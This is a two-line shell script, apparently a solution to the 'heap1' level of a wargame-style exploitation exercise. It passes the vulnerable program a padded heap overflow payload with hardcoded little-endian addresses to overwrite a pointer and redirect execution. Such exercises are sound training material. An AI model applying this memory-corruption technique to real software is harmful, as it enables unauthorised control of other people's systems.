#! /bin/sh
./heap1 `python -c "print 'A'*20+'\x1c\xa0\x04\x08'"`  `python -c "print '\xcb\x84\x04\x08'"`

